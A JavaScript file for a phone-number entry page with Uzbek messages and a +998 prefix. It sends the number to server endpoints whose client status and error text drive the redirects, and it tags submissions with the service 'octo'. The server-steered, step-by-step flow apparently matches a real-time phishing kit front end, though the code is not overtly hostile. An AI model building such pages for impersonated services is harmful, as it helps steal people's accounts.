const form = document.getElementById("phoneForm");
const phoneInput = document.getElementById("phone");
const statusMessage = document.getElementById("statusMessage");
const phoneError = document.getElementById("phoneError");
const submitButton = form.querySelector("button[type='submit']");
const digitButtons = Array.from(document.querySelectorAll("[data-digit]"));
const deleteButton = document.getElementById("octoDeleteButton");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");
const service = "octo";

const formatDigits = (value) => {
  return value.replace(/\D/g, "");
};

const setStatus = (message, type = "") => {
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (phoneError) {
    phoneError.textContent = message;
  }
};

const setButtonState = (isReady) => {
  submitButton.textContent = ">";
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validatePhone = () => {
  const localNumber = phoneInput.value.replace(/\D/g, "");

  if (!localNumber.length) {
    setFieldError("");
    return false;
  }

  setFieldError("");
  return true;
};

const loadClient = async () => {
  if (!clientId) return null;

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) return null;

  if (data.client.status === "waiting") {
    window.location.replace(data.client.redirectUrl);
    return null;
  }

  if (data.client.status !== "phone") {
    window.location.replace(data.client.redirectUrl);
    return null;
  }

  if (data.client.currentError) {
    setStatus(data.client.currentError, "error");
  }

  if (data.client.phone) {
    const localPhone = data.client.phone.replace("+998", "");
    phoneInput.value = formatDigits(localPhone);
  }

  setButtonState(validatePhone());

  return data.client;
};

const syncPhoneValue = (value) => {
  phoneInput.value = formatDigits(value);
  const isValid = validatePhone();
  setButtonState(isValid);
};

phoneInput.addEventListener("input", (event) => {
  syncPhoneValue(event.target.value);
});

digitButtons.forEach((button) => {
  button.addEventListener("click", () => {
    const digits = phoneInput.value.replace(/\D/g, "");
    syncPhoneValue(`${digits}${button.dataset.digit}`);
  });
});

if (deleteButton) {
  deleteButton.addEventListener("click", () => {
    const digits = phoneInput.value.replace(/\D/g, "");
    syncPhoneValue(digits.slice(0, -1));
  });
}

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const localNumber = phoneInput.value.replace(/\D/g, "");
  if (!validatePhone()) {
    setStatus("Iltimos, to`g`ri telefon raqamini kiriting.", "error");
    setButtonState(false);
    return;
  }

  const fullPhone = `998${localNumber}`;
  setButtonState(false);
  setStatus("Ma`lumot yuborilmoqda...");

  try {
    const isRetry = Boolean(clientId);
    const response = await fetch(
      isRetry ? `/api/client/${clientId}/submit-step` : "/api/submit-phone",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(
          isRetry ? { step: "phone", value: fullPhone } : { phone: fullPhone, service }
        )
      }
    );

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Yuborish muvaffaqiyatsiz bo`ldi. Qayta urinib ko`ring.", "error");
    setButtonState(validatePhone());
  }
});

setButtonState(false);
loadClient();

